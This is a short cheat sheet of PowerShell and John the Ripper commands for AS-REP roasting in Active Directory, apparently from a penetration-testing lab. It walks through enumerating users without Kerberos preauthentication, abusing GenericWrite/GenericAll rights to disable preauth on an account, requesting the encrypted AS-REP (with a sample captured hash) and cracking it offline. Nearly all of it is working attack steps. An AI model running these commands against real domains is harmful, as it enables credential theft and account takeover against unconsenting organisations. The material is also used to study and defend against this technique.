# Targeted Kerberoasting (AS-REP)
- If a user's UserAccountControl settings have "Do not require Kerberos
preauthentication" enabled i.e. Kerberos preauth is disabled, it is
possible to grab user's crackable AS REP and brute force it offline.
- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth
can be forced disabled as well.

1. Enumerate accounts with Kerberos 'Preauth disabled'
```powershell
#use powerview_dev
Get-DomainUser -PreauthNotRequired -Verbose | select samaccountname

# ADModule
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

we could also force disable kerberos preauth
```powershell
# enum permissions for RDPUsers on ACLs
# using powerview_dev
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# We are looking for ActiveDirectoryRights: GenericAll or GenericWrite

Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose

#use powerview_dev
Get-DomainUser -PreauthNotRequired -Verbose
```

2. Request encrypted AS-REP for offline brute-force

```powershell
#Using ASREPRoast.ps1
Get-ASREPHash -UserName VPN1User -Verbose

#$krb5asrep$VPN133User@dollarcorp.moneycorp.local:8d2ae26a38931b2b#1aa6019a1e75a69e$e633e3264bc2ce410bbb1e351c5ad16a1d2dc
#cef69de43dd1a8e807a19e73c2695bd9f51a2a41caf6f16fa2214a300057c58e6#e5f635e10c78233c27855c1d589600a1cd1a586fda15fba1777ee5
#8a74c0b019633598139b7dc968c172baa31b48b6c743dd63c9403f189d9e69a2e#fd78d1b715178b8eb8df746d9e62a49670b356ad1a2790aa100ece
#f8941a010e1c5c1274e2c29090696acd2ec247bbf35ad5c1b7878d6247128dcbb#b167c78f96ce015e6cbb6358d294b854b9d20c5c5fafaf69f68cd8
#8b20c536a107eb5ad2704663213066bcfe628677c1d87c96486c7f1e46c4fa864#5c46d07a83396c710d3840c168eee2287d986a0c25bf3b7a202bf3
#fbd4c944ad

#enum all users with kerberos preauth disabled and request a hash
Invoke-ASREPRoast -Verbose
```

3. Crack hashes
```
#using john (bleeding-jumbo branch)
./john vpn1user.txt --wordlist=wordlist.txt

```